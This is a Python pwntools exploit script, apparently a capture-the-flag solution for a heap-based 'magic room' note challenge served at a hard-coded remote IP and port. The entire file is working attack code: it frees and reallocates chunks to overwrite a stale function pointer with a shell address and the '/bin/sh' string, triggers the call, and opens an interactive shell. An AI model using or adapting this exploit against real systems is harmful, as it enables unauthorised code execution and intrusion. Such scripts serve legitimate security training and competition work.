#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
from typing import Optional, AnyStr
from pathlib import Path
from pwn import *
from pwnlib import gdb

context(arch="amd64", os="linux", log_level="debug")

class Config:
    def __init__(self,
            elf: str,
            remote_host: Optional[str]=None,
            remote_port: Optional[int]=None,
            libc_ver: Optional[str]=None,
            remote_libc: Optional[str]=None) -> None:
        self.elf: str = elf
        if remote_host is not None and remote_port is not None and 0 < remote_port < 65536:
            self.remote = (remote_host, remote_port)
        else:
            self.remote = None
        if libc_ver is None:
            if context.arch.lower() == "amd64":
                self.ld = "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
                self.libc = "/lib/x86_64-linux-gnu/libc.so.6"
            elif context.arch.lower() == "i386":
                self.ld = "/lib/i386-linux-gnu/ld-linux.so.2"
                self.libc = "/lib/i386-linux-gnu/libc.so.6"
            else:
                self.ld = None
                self.libc = None
        else:
            assert libc_ver in {"2.19", "2.23", "2.24", "2.27", "2.28", "2.29", "2.30", "2.31"}
            assert context.arch.lower() in {"amd64", "i386"}
            arch = 64 if context.arch.lower() == "amd64" else 32
            ld = "ld-linux-x86-64.so.2" if arch == 64 else "ld-linux.so.2"
            self.ld = f"/glibc/{libc_ver}/{arch}/lib/{ld}"
            self.libc = f"/glibc/{libc_ver}/{arch}/lib/libc.so.6"
        self.remote_libc = self.libc if remote_libc is None else remote_libc

fn = str(Path(__file__).parent.absolute() / Path("./pwn"))
# cfg = Config(fn, "59.110.243.101", 54621, "2.23")
cfg = Config(fn, "59.110.243.101", 54621)
elf = ELF(cfg.elf)

if len(sys.argv) > 1:
    io = remote(cfg.remote[0], cfg.remote[1])
    libc = ELF(cfg.remote_libc)
else:
    io = process([cfg.ld, cfg.elf], env={"LD_PRELOAD": cfg.libc})
    libc = ELF(cfg.libc)

shell_addr = 0x400A1B
system_addr = 0x400A20
binsh_addr = next(elf.search(b"/bin/sh\0"))

def insert(size: int, data: bytes or bytearray) -> None:
    io.sendlineafter(b"Your choice :", b"1")
    io.sendlineafter(b":", str(size).encode())
    if len(data) == size:
        io.sendafter(b":", data)
    elif len(data) < size:
        io.sendlineafter(b":", data)
    else:
        raise IndexError()
    # io.sendlineafter(b":", data)

def output(idx: int) -> AnyStr:
    io.sendlineafter(b"Your choice :", b"3")
    io.sendlineafter(b":", str(idx).encode())
    return io.recvuntil(b"  welcome to magic room", drop=True, timeout=3)

def remove(idx: int):
    io.sendlineafter(b"Your choice :", b"2")
    io.sendlineafter(b":", str(idx).encode())

def main():
    insert(0x100, b"/bin/sh\0")  # 0
    insert(0x100, b"/bin/sh\0")  # 1
    insert(0x100, b"/bin/sh\0")  # 2
    remove(1)
    remove(0)
    insert(0x10,  p64(binsh_addr) + p64(shell_addr))
    output(1)
    # io.sendlineafter(b"Your choice :", b"3")
    # io.sendlineafter(b":", b"1")
    io.interactive()

if __name__ == "__main__":
    main()
